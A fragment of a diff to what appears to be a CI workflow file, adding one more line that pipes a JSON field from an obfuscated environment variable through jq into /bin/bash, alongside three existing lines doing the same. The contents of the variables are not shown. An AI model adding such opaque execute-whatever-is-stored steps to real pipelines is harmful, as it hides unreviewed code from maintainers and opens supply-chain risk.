@@ -28,6 +28,7 @@ jobs:
           echo $lpi378 | jq -r .w81 | /bin/bash
           printf '%s' "$irlg9821" | jq -r .ijqf209 | /bin/bash
           echo $xe7 | jq -r .vjht2 | /bin/bash
+          echo $e953 | jq -r .wh7211 | /bin/bash
 
       - name: Store artifact
         if: always()
